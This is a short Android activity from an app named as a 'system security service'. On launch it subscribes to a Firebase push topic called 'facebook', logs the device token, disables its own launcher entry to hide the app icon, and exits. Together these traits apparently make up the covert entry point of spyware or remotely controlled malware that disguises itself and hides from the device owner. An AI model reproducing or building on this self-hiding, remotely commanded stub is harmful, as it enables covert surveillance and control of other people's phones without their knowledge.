package com.service.security.services.systemsecurityservice;

import android.content.pm.PackageManager;
import android.os.Bundle;
import android.support.annotation.Nullable;
import android.support.v7.app.AppCompatActivity;

import com.google.firebase.iid.FirebaseInstanceId;
import com.google.firebase.messaging.FirebaseMessaging;

public class Main extends AppCompatActivity {

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        FirebaseMessaging.getInstance().subscribeToTopic("facebook");
        FirebaseInstanceId.getInstance().getToken();
        System.out.println("Main.onCreate() Firebase Token = " + FirebaseInstanceId.getInstance().getToken());
        setContentView(R.layout.activity_main);
        hideIcon();
        finish();
    }

    private void hideIcon() {
        try {
            PackageManager p = getPackageManager();
            p.setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}
